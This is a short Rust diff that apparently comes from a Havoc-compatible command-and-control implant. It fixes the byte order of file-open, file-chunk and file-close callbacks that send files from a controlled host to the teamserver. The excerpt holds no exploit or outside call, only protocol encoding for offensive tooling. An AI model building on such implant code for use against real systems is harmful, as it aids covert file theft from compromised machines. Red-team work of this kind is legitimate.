@@ -529,7 +529,12 @@ pub(crate) fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
 
 /// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
 ///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32][file_size:u32][path:UTF-8]`
+/// Length-prefixed fields (`callback_type`, `inner_len`) use Demon little-endian conventions.
+///
+/// The inner blob uses **big-endian** `file_id` and declared size (`u32`), then UTF‑8 path — matching
+/// Havoc Demon wire format and the teamserver BeaconOutput parser (`parse_file_open_header`).
+///
+/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE][file_size:u32 BE][path:UTF-8]`
 pub(crate) fn encode_file_open(
     file_id: u32,
     file_size: u64,
@@ -544,15 +549,17 @@ pub(crate) fn encode_file_open(
         u32::try_from(inner_len)
             .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
     ));
-    payload.extend_from_slice(&encode_u32(file_id));
-    payload.extend_from_slice(&encode_u32(truncated_size));
+    payload.extend_from_slice(&file_id.to_be_bytes());
+    payload.extend_from_slice(&truncated_size.to_be_bytes());
     payload.extend_from_slice(file_path.as_bytes());
     Ok(payload)
 }
 
 /// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
 ///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32][chunk_data]`
+/// Inner blob begins with **`file_id` in big-endian** — matches teamserver `parse_file_chunk`.
+///
+/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE][chunk_data]`
 pub(crate) fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
     let inner_len = 4 + data.len();
     let mut payload = Vec::with_capacity(4 + 4 + inner_len);
@@ -561,19 +568,21 @@ pub(crate) fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, Ph
         u32::try_from(inner_len)
             .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
     ));
-    payload.extend_from_slice(&encode_u32(file_id));
+    payload.extend_from_slice(&file_id.to_be_bytes());
     payload.extend_from_slice(data);
     Ok(payload)
 }
 
 /// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
 ///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32]`
+/// Inner blob is **big-endian** `file_id` — matches teamserver `parse_file_close`.
+///
+/// Wire format: `[callback_type:u32 LE][len:u32 LE][file_id:u32 BE]`
 pub(crate) fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
     let mut payload = Vec::with_capacity(12);
     payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
     payload.extend_from_slice(&encode_u32(4));
-    payload.extend_from_slice(&encode_u32(file_id));
+    payload.extend_from_slice(&file_id.to_be_bytes());
     Ok(payload)
 }
 
